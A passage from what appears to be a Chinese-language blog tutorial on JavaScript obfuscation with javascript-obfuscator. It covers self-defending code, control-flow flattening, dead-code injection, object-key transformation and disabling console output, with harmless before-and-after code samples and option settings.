_0x30c497(</span><br><span class="line">          <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">            <span class="string">"(?:^|;\x20)"</span> +</span><br><span class="line">              _0x51923d[<span class="string">"replace"</span>](<span class="regexp">/([.$?*|&#123;&#125;()[]\/+^])/g</span>, <span class="string">"$1"</span>) +</span><br><span class="line">              <span class="string">"=([^;]*)"</span></span><br><span class="line">          )</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">var</span> _0x817646 = <span class="function"><span class="keyword">function</span> (<span class="params">_0xf3fae7, _0x5d8208</span>) </span>&#123;</span><br><span class="line">          _0xf3fae7(++_0x5d8208);</span><br><span class="line">        &#125;;</span><br><span class="line">        _0x817646(_0x577762, _0x57c2c0);</span><br><span class="line">        <span class="keyword">return</span> _0x557e06 ? <span class="built_in">decodeURIComponent</span>(_0x557e06[<span class="number">0x1</span>]) : <span class="literal">undefined</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x4673cd = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x4c6c5c = <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">        <span class="string">"\x5cw+\x20*\x5c(\x5c)\x20*&#123;\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*&#125;"</span></span><br><span class="line">      );</span><br><span class="line">      <span class="keyword">return</span> _0x4c6c5c[<span class="string">"test"</span>](_0x16b3fe[<span class="string">"removeCookie"</span>][<span class="string">"toString"</span>]());</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x16b3fe[<span class="string">"updateCookie"</span>] = _0x4673cd;</span><br><span class="line">    <span class="keyword">var</span> _0x5baa80 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x1faf19 = _0x16b3fe[<span class="string">"updateCookie"</span>]();</span><br><span class="line">    <span class="keyword">if</span> (!_0x1faf19) &#123;</span><br><span class="line">      _0x16b3fe[<span class="string">"setCookie"</span>]([<span class="string">"*"</span>], <span class="string">"counter"</span>, <span class="number">0x1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_0x1faf19) &#123;</span><br><span class="line">      _0x5baa80 = _0x16b3fe[<span class="string">"getCookie"</span>](<span class="literal">null</span>, <span class="string">"counter"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _0x16b3fe[<span class="string">"removeCookie"</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x35976e();</span><br><span class="line">&#125;)(_0x26da, <span class="number">0x140</span>);</span><br><span class="line"><span class="keyword">var</span> _0x4391 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1b42d8, _0x57edc8</span>) </span>&#123;</span><br><span class="line">  _0x1b42d8 = _0x1b42d8 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x2fbeca = _0x26da[_0x1b42d8];</span><br><span class="line">  <span class="keyword">return</span> _0x2fbeca;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x197926 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x10598f = !![];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0xffa3b3, _0x7a40f9</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x48e571 = _0x10598f</span><br><span class="line">      ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x7a40f9) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x2194b5 = _0x7a40f9[<span class="string">"apply"</span>](_0xffa3b3, <span class="built_in">arguments</span>);</span><br><span class="line">            _0x7a40f9 = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> _0x2194b5;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    _0x10598f = ![];</span><br><span class="line">    <span class="keyword">return</span> _0x48e571;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> _0x2c6fd7 = _0x197926(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x4828bb = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"\x64\x65\x76"</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    _0x35c3bc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"\x77\x69\x6e\x64\x6f\x77"</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x456070 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x4576a4 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">      <span class="string">"\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> !_0x4576a4[<span class="string">"\x74\x65\x73\x74"</span>](</span><br><span class="line">      _0x4828bb[<span class="string">"\x74\x6f\x53\x74\x72\x69\x6e\x67"</span>]()</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x3fde69 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0xabb6f4 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(</span><br><span class="line">      <span class="string">"\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> _0xabb6f4[<span class="string">"\x74\x65\x73\x74"</span>](</span><br><span class="line">      _0x35c3bc[<span class="string">"\x74\x6f\x53\x74\x72\x69\x6e\x67"</span>]()</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x2d9a50 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x58fdb4</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x2a6361 = ~<span class="number">-0x1</span> &gt;&gt; (<span class="number">0x1</span> + (<span class="number">0xff</span> % <span class="number">0x0</span>));</span><br><span class="line">    <span class="keyword">if</span> (_0x58fdb4[<span class="string">"\x69\x6e\x64\x65\x78\x4f\x66"</span>](<span class="string">"\x69"</span> === _0x2a6361)) &#123;</span><br><span class="line">      _0xc388c5(_0x58fdb4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> _0xc388c5 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x2073d6</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x6bb49f = ~<span class="number">-0x4</span> &gt;&gt; (<span class="number">0x1</span> + (<span class="number">0xff</span> % <span class="number">0x0</span>));</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      _0x2073d6[<span class="string">"\x69\x6e\x64\x65\x78\x4f\x66"</span>]((!![] + <span class="string">""</span>)[<span class="number">0x3</span>]) !== _0x6bb49f</span><br><span class="line">    ) &#123;</span><br><span class="line">      _0x2d9a50(_0x2073d6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (!_0x456070()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!_0x3fde69()) &#123;</span><br><span class="line">      _0x2d9a50(<span class="string">"\x69\x6e\x64\u0435\x78\x4f\x66"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _0x2d9a50(<span class="string">"\x69\x6e\x64\x65\x78\x4f\x66"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    _0x2d9a50(<span class="string">"\x69\x6e\x64\u0435\x78\x4f\x66"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">_0x2c6fd7();</span><br><span class="line"><span class="built_in">console</span>[_0x4391(<span class="string">"0x0"</span>)](_0x4391(<span class="string">"0x1"</span>));</span><br></pre>      </td>    </tr>  </table></figure><p>如果我们将上述代码放到控制台，它的执行结果和之前是一模一样的，没有任何问题。</p><p>如果我们将其进行格式化，然后贴到到浏览器控制台里面，浏览器会直接卡死无法运行。这样如果有人对代码进行了格式化，就无法正常对代码进行运行和调试，从而起到了保护作用。</p><h3 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h3><p>控制流平坦化其实就是将代码的执行逻辑混淆，使其变得复杂难读。其基本思想是将一些逻辑处理块都统一加上一个前驱逻辑块，每个逻辑块都由前驱逻辑块进行条件判断和分发，构成一个个闭环逻辑，导致整个执行逻辑十分复杂难读。</p><p>比如说这里有一段示例代码：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="built_in">console</span>.log(c);</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br></pre>      </td>    </tr>  </table></figure><p>代码逻辑一目了然，依次在控制台输出了 c、a、b 三个变量的值，但如果把这段代码进行控制流平坦化处理后，代码就会变成这样：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> s = <span class="string">"3|1|2"</span>.split(<span class="string">"|"</span>);</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (s[x++]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"1"</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(a);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"2"</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(b);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"3"</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(c);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，混淆后的代码首先声明了一个变量 s，它的结果是一个列表，其实是 <code>[&quot;3&quot;, &quot;1&quot;, &quot;2&quot;]</code>，然后下面通过 switch 语句对 s 中的元素进行了判断，每个 case 都加上了各自的代码逻辑。通过这样的处理，一些连续的执行逻辑就被打破了，代码被修改为一个 switch 语句，原本我们可以一眼看出的逻辑是控制台先输出 c，然后才是 a、b，但是现在我们必须要结合 switch 的判断条件和对应 case 的内容进行判断，我们很难再一眼每条语句的执行顺序了，这就大大降低了代码的可读性。</p><p>在 javascript-obfuscator 中我们通过 controlFlowFlattening 变量可以控制是否开启控制流平坦化，示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  controlFlowFlattening: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>使用控制流平坦化可以使得执行逻辑更加复杂难读，目前非常多的前端混淆都会加上这个选项。但启用控制流平坦化之后，代码的执行时间会变长，最长达 1.5 倍之多。</p><p>另外我们还能使用 controlFlowFlatteningThreshold 这个参数来控制比例，取值范围是 0 到 1，默认 0.75，如果设置为 0，那相当于 controlFlowFlattening 设置为 false，即不开启控制流扁平化 。</p><h3 id="无用代码注入"><a href="#无用代码注入" class="headerlink" title="无用代码注入"></a>无用代码注入</h3><p>无用代码即不会被执行的代码或对上下文没有任何影响的代码，注入之后可以对现有的 JavaScript 代码的阅读形成干扰。我们可以使用 deadCodeInjection 参数开启这个选项，默认为 false。</p><p>比如这里有一段代码：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> a = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"nice to meet you"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line">b();</span><br></pre>      </td>    </tr>  </table></figure><p>这里就声明了方法 a 和 b，然后依次进行调用，分别输出两句话。</p><p>但经过无用代码注入处理之后，代码就会变成类似这样的结果：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> _0x16c18d = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!![[]]) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"this"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"is"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"dead"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"code"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> _0x1f7292 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"xmv2nOdfy2N"</span>.charAt(<span class="number">4</span>) !== <span class="built_in">String</span>.fromCharCode(<span class="number">110</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"this"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"is"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"dead"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"code"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"nice to meet you"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">_0x16c18d();</span><br><span class="line">_0x1f7292();</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，每个方法内部都增加了额外的 if else 语句，其中 if 的判断条件还是一个表达式，其结果是 true 还是 false 我们还不太一眼能看出来，比如说 <code>_0x1f7292</code> 这个方法，它的 if 判断条件是：</p><figure class="highlight reasonml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="string">"xmv2nOdfy2N"</span>.<span class="built_in">char</span><span class="constructor">At(4)</span> !== <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span>from<span class="constructor">CharCode(110)</span></span><br></pre>      </td>    </tr>  </table></figure><p>在不等号前面其实是从字符串中取出指定位置的字符，不等号后面则调用了 fromCharCode 方法来根据 ascii 码转换得到一个字符，然后比较两个字符的结果是否是不一样的。前者经过我们推算可以知道结果是 n，但对于后者，多数情况下我们还得去查一下 ascii 码表才能知道其结果也是 n，最后两个结果是相同的，所以整个表达式的结果是 false，所以 if 后面跟的逻辑实际上就是不会被执行到的无用代码，但这些代码对我们阅读代码起到了一定的干扰作用。</p><p>因此，这种混淆方式通过混入一些特殊的判断条件并加入一些不会被执行的代码，可以对代码起到一定的混淆干扰作用。</p><p>在 javascript-obfuscator 中，我们可以通过 deadCodeInjection 参数控制无用代码的注入，配置如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  deadCodeInjection: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>另外我们还可以通过设置 deadCodeInjectionThreshold 参数来控制无用代码注入的比例，取值 0 到 1，默认是 0.4。</p><h3 id="对象键名替换"><a href="#对象键名替换" class="headerlink" title="对象键名替换"></a>对象键名替换</h3><p>如果是一个对象，可以使用 transformObjectKeys 来对对象的键值进行替换，示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var object = &#123;</span></span><br><span class="line"><span class="string">        foo: 'test1',</span></span><br><span class="line"><span class="string">        bar: &#123;</span></span><br><span class="line"><span class="string">            baz: 'test2'</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;)(); </span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  transformObjectKeys: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>输出结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x7a5d = [<span class="string">"bar"</span>, <span class="string">"test2"</span>, <span class="string">"test1"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x59fec5, _0x2e4fac</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x231e7a = <span class="function"><span class="keyword">function</span> (<span class="params">_0x46f33e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x46f33e) &#123;</span><br><span class="line">      _0x59fec5[<span class="string">"push"</span>](_0x59fec5[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x231e7a(++_0x2e4fac);</span><br><span class="line">&#125;)(_0x7a5d, <span class="number">0x167</span>);</span><br><span class="line"><span class="keyword">var</span> _0x3bc4 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x309ad3, _0x22d5ac</span>) </span>&#123;</span><br><span class="line">  _0x309ad3 = _0x309ad3 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x3a034e = _0x7a5d[_0x309ad3];</span><br><span class="line">  <span class="keyword">return</span> _0x3a034e;</span><br><span class="line">&#125;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x9f1fd1 = &#123;&#125;;</span><br><span class="line">  _0x9f1fd1[<span class="string">"foo"</span>] = _0x3bc4(<span class="string">"0x0"</span>);</span><br><span class="line">  _0x9f1fd1[_0x3bc4(<span class="string">"0x1"</span>)] = &#123;&#125;;</span><br><span class="line">  _0x9f1fd1[_0x3bc4(<span class="string">"0x1"</span>)][<span class="string">"baz"</span>] = _0x3bc4(<span class="string">"0x2"</span>);</span><br><span class="line">&#125;)();</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，Object 的变量名被替换为了特殊的变量，使得可读性变差，这样我们就不好直接通过变量名进行搜寻了，这也可以起到一定的防护作用。</p><h3 id="禁用控制台输出"><a href="#禁用控制台输出" class="headerlink" title="禁用控制台输出"></a>禁用控制台输出</h3><p>可以使用 disableConsoleOutput 来禁用掉 console.log 输出功能，加大调试难度，示例如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">console.log('hello world')</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  disableConsoleOutput: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> _0x3a39 = [</span><br><span class="line">  <span class="string">"debug"</span>,</span><br><span class="line">  <span class="string">"info"</span>,</span><br><span class="line">  <span class="string">"error"</span>,</span><br><span class="line">  <span class="string">"exception"</span>,</span><br><span class="line">  <span class="string">"trace"</span>,</span><br><span class="line">  <span class="string">"hello\x20world"</span>,</span><br><span class="line">  <span class="string">"apply"</span>,</span><br><span class="line">  <span class="string">"&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)"</span>,</span><br><span class="line">  <span class="string">"console"</span>,</span><br><span class="line">  <span class="string">"log"</span>,</span><br><span class="line">  <span class="string">"warn"</span>,</span><br><span class="line">];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x2a157a, _0x5d9d3b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x488e2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5bcb73</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x5bcb73) &#123;</span><br><span class="line">      _0x2a157a[<span class="string">"push"</span>](_0x2a157a[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x488e2c(++_0x5d9d3b);</span><br><span class="line">&#125;)(_0x3a39, <span class="number">0x10e</span>);</span><br><span class="line"><span class="keyword">var</span> _0x5bff = <span class="function"><span class="keyword">function</span> (<span class="params">_0x43bdfc, _0x52e4c6</span>) </span>&#123;</span><br><span class="line">  _0x43bdfc = _0x43bdfc - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0xb67384 = _0x3a39[_0x43bdfc];</span><br><span class="line">  <span class="keyword">return</span> _0xb67384;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x349b01 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x1f484b = !![];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0x5efe0d, _0x33db62</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x20bcd2 = _0x1f484b</span><br><span class="line">      ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x33db62) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x77054c = _0x33db62[_0x5bff(<span class="string">"0x0"</span>)](_0x5efe0d, <span class="built_in">arguments</span>);</span><br><span class="line">            _0x33db62 = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> _0x77054c;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    _0x1f484b = ![];</span><br><span class="line">    <span class="keyword">return</span> _0x20bcd2;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> _0x19f538 = _0x349b01(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x7ab6e4 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x157bff;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e672c = <span class="built_in">Function</span>(</span><br><span class="line">      <span class="string">"return\x20(function()\x20"</span> + _0x5bff(<span class="string">"0x1"</span>) + <span class="string">");"</span></span><br><span class="line">    );</span><br><span class="line">    _0x157bff = _0x5e672c();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x11028d) &#123;</span><br><span class="line">    _0x157bff = <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!_0x157bff[_0x5bff(<span class="string">"0x2"</span>)]) &#123;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)] = (<span class="function"><span class="keyword">function</span> (<span class="params">_0x7ab6e4</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x5a8d9e = &#123;&#125;;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x3"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x4"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x5"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x6"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span 